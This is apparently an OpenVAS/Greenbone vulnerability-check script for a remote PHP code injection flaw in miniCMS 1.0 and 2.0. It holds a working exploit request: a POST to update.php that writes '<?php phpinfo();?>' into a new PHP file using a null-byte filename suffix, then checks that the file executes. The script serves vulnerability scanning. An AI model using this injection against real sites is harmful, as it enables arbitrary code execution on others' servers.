if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103399" );
	script_bugtraq_id( 51612 );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "miniCMS Multiple Remote PHP Code Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51612" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/mini-cms/files/mini-cms/" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-01-24 11:44:44 +0100 (Tue, 24 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "miniCMS is prone to multiple vulnerabilities that attackers can
  leverage to execute arbitrary PHP code because the application fails
  to adequately sanitize user-supplied input." );
	script_tag( name: "impact", value: "Successful attacks can compromise the affected application and
  possibly the underlying computer." );
	script_tag( name: "affected", value: "miniCMS 1.0 and 2.0 are vulnerable, other versions may also be
  affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/minicms", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(IsMatchRegexp( buf, "This site is managed using.*MiniCMS" )){
		useragent = http_get_user_agent();
		vtstrings = get_vt_strings();
		page = vtstrings["lowercase_rand"] + ".php";
		ex = "title=1&metadata=1&area=content&content=<?php phpinfo();?>&page=" + page + "%00";
		len = strlen( ex );
		host = http_host_name( port: port );
		req = NASLString( "POST ", dir, "/update.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: en-us,en;q=0.5\\r\\n", "Accept-Encoding: gzip, deflate\\r\\n", "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n", "Connection: keep-alive\\r\\n", "Referer: http://", host, dir, "/index.php?page=1\\r\\n", "Cookie: miniCMSdemo=32b5075aba3eb6c5d11129ec114346c2\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", ex );
		result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(ContainsString( result, page )){
			url = dir + "/content/" + page;
			if(http_vuln_check( port: port, url: url, pattern: "<title>phpinfo\\(\\)" )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

